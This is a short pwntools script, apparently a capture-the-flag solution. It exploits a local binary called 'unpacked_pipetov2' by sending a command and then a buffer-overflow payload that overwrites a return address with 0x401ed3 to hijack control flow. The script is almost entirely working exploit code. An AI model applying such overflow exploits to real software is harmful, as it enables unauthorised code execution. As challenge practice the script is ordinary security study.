#!/usr/bin/python3

from pwn import *

p = process('../unpacked_pipetov2')

addr = 0x401ed3

payload = b"A" * 10 + p64(addr)

p.sendline(b"monitor_radiation_levels")
print(payload)
print(len(payload))

p.sendline(payload)

p.interactive()

